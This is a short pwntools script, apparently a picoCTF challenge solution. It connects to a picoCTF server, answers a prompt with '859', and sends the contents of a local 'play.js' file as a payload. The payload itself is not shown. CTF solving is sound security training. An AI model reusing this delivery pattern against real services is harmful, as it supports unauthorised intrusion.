from pwn import *
context.log_level="debug"
gg = open("play.js","r")
gg = gg.read(1024)
p = remote("mercury.picoctf.net", 48700)
p.recvuntil("5k:")
p.sendline("859")
p.recvuntil("please!!")
p.sendline(gg)
print(p.recvall())
